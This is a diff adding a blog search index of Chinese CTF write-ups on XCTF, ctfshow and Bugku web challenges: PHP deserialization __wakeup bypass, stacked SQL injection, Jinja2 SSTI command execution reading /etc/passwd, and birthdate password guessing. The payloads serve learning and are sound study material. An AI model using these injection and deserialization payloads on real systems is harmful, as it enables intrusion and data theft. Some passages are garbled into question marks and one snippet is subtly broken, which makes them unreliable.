@@ -1,0 +1,189 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>攻防世界</title>
+    <url>/2021/12/14/123456/</url>
+    <content><![CDATA[<h1 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h1><p>这一道题没有给环境，打开附件看的我一脸懵，还还以为是加密了，但想一想又不像是被加密了。然后看到了熟悉的标签，我还以为是xss，但是我又不知道该从何下手。于是去看了wp,感觉自己好懒，函数懒得去搜，果然还是函数出了问题。</p>
+<script>_='function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){    [0]);.splice(0,1)}}}    \'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["    write(s[o%4]buttonif(e.ment';for(Y in $='    ')with(_.split($[Y]))_=join(pop());eval(_)</script>
+
+<p>问题就出在eval这个函数身上，eval(string)函数可计算某个字符串，并执行其中的JavaScript代码。<img src="/2021/12/14/123456/2173462-20210112131239936-1971780407.png" class="" title="img"></p>
+<p>他把$()当作字符串执行而导致乱码，alert（）可以把$()中的内容作为弹窗显示出来，显示源代码。</p>
+<p>因为是javascript,因此可以选择在浏览器中打开，让其显示执行结果，附件显示出来一个输入框，修改后在浏览器中打开，显示出来的是源代码，复制整理后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function $()</span><br><span class="line">&#123;</span><br><span class="line">    var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">if(e.match(/^be0f23/)!=null)</span><br><span class="line">if(e.match(/233ac/)!=null)</span><br><span class="line">if(e.match(/e98aa$/)!=null)</span><br><span class="line">if(e.match(/c7be9/)!=null)</span><br><span class="line">&#123;var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">var s=[t,n,r,i];</span><br><span class="line">for(var o=0;o&lt;13;++o)&#123;document.write(s[o%4][0]);</span><br><span class="line">s[o%4].splice(0,1)&#125;&#125;&#125;document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button </span><br><span class="line">onclick=$()&gt;Ok&lt;/button&gt;&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure>
+
+<p>又要考察函数了，这次考察的是splice() </p>
+<img src="/2021/12/14/123456/2173462-20210112131256987-1462219035.png" class="" title="img">
+
+<p>输入满足条件的e使其显示出来</p>
+<p>四个正则匹配</p>
+<p>/^be0f23/ ———- ^ 头部匹配</p>
+<p>/233ac/ ———- 中间匹配</p>
+<p>/e98aa$/ ———- $ 尾部匹配</p>
+<p>/c7be9/ ———- 中间匹配</p>
+<p>构造字符串e <strong>be0f233ac7be98aa</strong></p>
+<p>然后在输入框中输入即可获得flag</p>
+<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>class xctf{<br>public $flag = ‘111’;<br>public function __wakeup(){<br>exit(‘bad requests’);<br>}<br>?code=</p>
+<p>exit()这个函数和die()这个函数差不多，输出一条脚本之后，就退出当前脚本。当然不能让他退出呀，想办法让他绕过wakeup(),这个函数。</p>
+<?php
+class xctf{
+public $flag = '111';
+public function __wakeup(){
+exit('bad requests');
+}
+}
+$c=new xctf();
+printf(serialize($c));
+?>
+
+<p>O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
+<p>绕过后O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
+<p>？code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
+<p>获得flag</p>
+<h1 id="python-template-injection"><a href="#python-template-injection" class="headerlink" title="_python_template_injection"></a>_python_template_injection</h1><p>????????python????????????????????????<br>???????&lt;type ?object?&gt;?&gt;?????&gt;?????????????????</p>
+<p><strong>class</strong>  ?????????<br><strong>mro</strong>    ?????????????????????????????????<br><strong>base</strong>   ???????????  // <strong>base</strong>?<strong>mro</strong>?????????</p>
+<p><strong>subclasses</strong>   ???????????????????????????????????<br><strong>init</strong>  ???????<br><strong>globals</strong>  ???????????????</p>
+<h1 id="ctfshow-web-3"><a href="#ctfshow-web-3" class="headerlink" title="ctfshow web 3"></a>ctfshow web 3</h1><p>/?id=2 union select * from article where id=1000</p>
+<p>?????????????????????????</p>
+<h1 id="ctfshow-web-4"><a href="#ctfshow-web-4" class="headerlink" title="ctfshow web 4"></a>ctfshow web 4</h1><p>/or|-|\|/|\*|&lt;|&gt;|!|x|hex|(|)|+|select/i”</p>
+<p>?select?????? /?id=2 || id=1000</p>
+<p><strong>intval()????????????????????????????????????</strong></p>
+<p><strong>????????????????</strong></p>
+<p>|??????</p>
+<h1 id="ctfshow-web-5"><a href="#ctfshow-web-5" class="headerlink" title="ctfshow web 5"></a>ctfshow web 5</h1><p>/?id=~~1000</p>
+<p>?????payload?????get???????????????????? ?~~1000? ???????intval()???????? 0</p>
+<p>?select?????????????id=1000</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>unserialize</title>
+    <url>/2021/12/26/unserialize/</url>
+    <content><![CDATA[<h1 id="UNSERIALIZE"><a href="#UNSERIALIZE" class="headerlink" title="UNSERIALIZE"></a>UNSERIALIZE</h1><p>Web_php_unserialize  攻防世界</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;           <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;			<span class="comment">//变量属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;      <span class="comment">//类方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; 		<span class="comment">//wakeup函数 返回index.php所以必须绕过次函数</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php     //flag所在文件</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;        		 <span class="comment">//判断是否传入参数</span></span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);  	<span class="comment">//对传入参数进行base64加密</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//正则检查</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>);      <span class="comment">//进行反序列化</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); 	<span class="comment">//返回想要结果</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>1.Demo  中file为变量，可以将fl4g.php作为变量传进去</p>
+<p>2.function __wakeup() {<br>    if ($this-&gt;file != ‘index.php’)</p>
+<p>强行要求输入的变量为index.php 考虑绕过</p>
+<p>3.(preg_match(‘/[oc]:\d+:/i’</p>
+<p>正则匹配，过滤掉以o/c:int   \d  是整数   /i区分大小写</p>
+<p>在文中过滤掉的是序列化后得到的O:4  ,改为O:+4即可过滤</p>
+<p>4.$var = base64_decode($_GET[‘var’]);</p>
+<p>输入的结果要base64加密</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;           <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;			<span class="comment">//变量属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;      <span class="comment">//类方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; 		<span class="comment">//wakeup函数 返回index.php所以必须绕过次函数</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php     //flag所在文件</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$C</span>=serialize(<span class="string">&#x27;$A&#x27;</span>);</span><br><span class="line"><span class="variable">$C</span>=str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$C</span>);</span><br><span class="line"><span class="variable">$C</span>=str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$C</span>);</span><br><span class="line">var_dump(<span class="variable">$C</span>);</span><br><span class="line">var_dump(base64_decode(<span class="variable">$C</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</p>
+]]></content>
+      <categories>
+        <category>unserialize</category>
+      </categories>
+      <tags>
+        <tag>unserialize</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql</title>
+    <url>/2021/12/26/sql/</url>
+    <content><![CDATA[<h1 id="攻防世界-supersqli"><a href="#攻防世界-supersqli" class="headerlink" title="攻防世界-supersqli"></a>攻防世界-supersqli</h1><p>打开是sql注入，但是过滤了好多东西 /select|update|delete|drop|insrt|where|./i</p>
+<p>网上搜了搜开始尝试着绕过，但是尝试了好几种绕过方法都不行，看了一下wp，知道是要采用堆叠注入，第一次知道，网上开搜。</p>
+<p>1.查数据库</p>
+<p>-1’;show databases;#</p>
+<p>但是不明白，感觉查这个库没啥子作用</p>
+<p>2.查表</p>
+<p>-1’;show tables;#</p>
+<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
+<p>出现了两个表单，都查询看一下嘛</p>
+<p>3.查列表</p>
+<p>（1）-1‘;show columns from <code>1919810931114514</code>;#</p>
+<p>​    字符串为表名时进行操作时要加反引号``这两个标记符号，弄了我好长时间，没注意到反引号这玩意，错把单引号当反引号</p>
+<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述">    flag ,NO字段</p>
+<p>（2）-1’;show columns from <code>words</code>;#</p>
+<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
+<p>id,NO等字段</p>
+<p>因为这里是字段，而不是列名，不能直接进行查询。而且通过观察int()发现，写入到的内容存到了id中，推测查询的是words表中的内容，即输入的内容都会在words这个表中进行查询，但是flag不在这个表中</p>
+<p>4.<strong>查询字段内容</strong></p>
+<p>有两种方法</p>
+<p>1.改表名</p>
+<p>根据在words表里发现id字段与查询框里的出的数据类型相同，一个数字，一个字符串，所以猜测默认查询的就是words表，inject（搜索框中）值应该赋给了id<br>利用：我们可以将含有flag字段的表命名为word，然后修改字段名字，不就查询到我们想要的结果！（前提是这里rename，alert关键字 没有做过滤）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #</span><br></pre></td></tr></table></figure>
+
+<p>查看flag</p>
+<p>1’ or 1=1#</p>
+<p>2.预编译来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>‘;sEt @sql = CONCAT(‘se’,‘lect * from <code>1919810931114514</code>;’); 进行预编译<br>prEpare stmt from @sql; 设置变量<br>EXECUTE stmt;# 执行</p>
+<p>对预编译不是很了解，了解之后再做补充吧！！</p>
+<p>最后，不愧是强网杯的题，真是难呀</p>
+<p>参考文章：<a href="https://blog.csdn.net/Mr_helloword/article/details/107935479">(40条消息) 攻防世界-supersqli详解_Mr_helloword的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>sql</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI</title>
+    <url>/2021/12/14/ssti/</url>
+    <content><![CDATA[<h1 id="SSTI-模板注入漏洞"><a href="#SSTI-模板注入漏洞" class="headerlink" title="SSTI 模板注入漏洞"></a>SSTI 模板注入漏洞</h1><p>文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。<br>思路：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p>
+<p>1.获取基类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用</span><br><span class="line">或者</span><br><span class="line">[].__class__.__bases__[0]       //其他的类似</span><br></pre></td></tr></table></figure>
+
+<p>2.获取本类的子类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p>3.找到可利用的方法</p>
+<p>&lt;type ‘file’&gt;等    &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找到目标文件，接着读取文件</p>
+<p>4.读写文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>有四种方法，具体详情参考第二篇文章</p>
+<p>参考文章：</p>
+<p><a href="https://www.cnblogs.com/cioi/p/12308518.html#a5">从零开始的ssti学习（已填） - Cxlover - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://blog.csdn.net/Onlyone_1314/article/details/121569766">(40条消息) XCTF-攻防世界CTF平台-Web类——12、Web_python_template_injection（SSTI服务器模板注入、Flask框架之Jinja2模板渲染引擎）_Onlyone_1314的博客-CSDN博客</a></p>
+<h1 id="Simple-SSTI-2-bugku"><a href="#Simple-SSTI-2-bugku" class="headerlink" title="Simple_SSTI_2  bugku"></a>Simple_SSTI_2  bugku</h1><p>第二次做这种题，感觉还是不会做，跟着wp做的</p>
+<p>1.查看上一级所存在的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;ls ../&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.查看文件夹中有哪些文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;ls /app&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.查看文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有些不理解，先当作常用命令记着吧！！</p>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>随笔</title>
+    <url>/2021/12/29/%E9%9A%8F%E7%AC%94/</url>
+    <content><![CDATA[<h1 id="Bugku-CTF-社工初步信息收集"><a href="#Bugku-CTF-社工初步信息收集" class="headerlink" title="Bugku CTF 社工初步信息收集"></a>Bugku CTF 社工初步信息收集</h1><p>打开之后就是一顿乱点，然后下载了一个文件，打开之后是一个登陆页面，输入之后也没啥子用，暂且不管。然后进行扫描，又发现一个登陆页面，看wp知道要利用wireshark对下载文件中的登陆页面进行爆破，奈何我没此工具，待我下午弄一个之后再操作吧！爆破之后发现user和pass，pass需要base64解码，然后在官网提供的登陆页面登陆，但是还是错误。</p>
+<p>敲重点，涌向登录有两种方式</p>
+<p>1.密码登录，官网提供的 邮箱登录</p>
+<p> 账号+登陆密码</p>
+<p>2.授权密码登陆 ，由第三方邮件系统登录</p>
+<p>客户端+授权密码登录</p>
+<p>这里尝试了第一种方法，接着尝试第二种方法。查看邮箱，分析得出账号和密码，根据中国人平时习惯，出生年月就是密码，试了试果然正确。</p>
+<h1 id="Bugku-变量1"><a href="#Bugku-变量1" class="headerlink" title="Bugku 变量1"></a>Bugku 变量1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^\w+$/&quot;</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到include,</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+</search>
